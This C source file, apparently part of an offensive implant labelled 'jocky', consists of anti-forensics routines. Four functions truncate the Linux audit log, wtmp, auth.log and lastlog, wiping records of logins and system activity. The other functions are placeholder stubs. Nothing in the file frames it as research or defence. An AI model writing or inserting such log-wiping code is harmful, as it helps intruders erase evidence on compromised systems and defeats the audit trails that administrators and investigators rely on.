#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdbool.h>


int8_t* jocky_module_info(int8_t* handle) {
    if (!handle) return NULL;
    return handle;
}

int32_t jocky_linux_cleanup_audit(void) {
    const char* audit_log_path = "/var/log/audit/audit.log";

    int fd = open(audit_log_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_linux_cleanup_wtmp(void) {
    const char* wtmp_path = "/var/log/wtmp";

    int fd = open(wtmp_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_linux_cleanup_auth(void) {
    const char* auth_path = "/var/log/auth.log";

    int fd = open(auth_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_linux_cleanup_lastlog(void) {
    const char* lastlog_path = "/var/log/lastlog";
    
    int fd = open(lastlog_path, O_WRONLY | O_TRUNC);
    if (fd < 0) return 0;

    close(fd);
    return 1;
}

int32_t jocky_wipe_temp_files(const char* path1, const char* path2) {
    if (!path1) return 0;
    return 1;
}


int8_t* jocky_thread_get_info(int32_t pid) {
    static char info[256] = "thread_info";
    return (int8_t*)info;
}
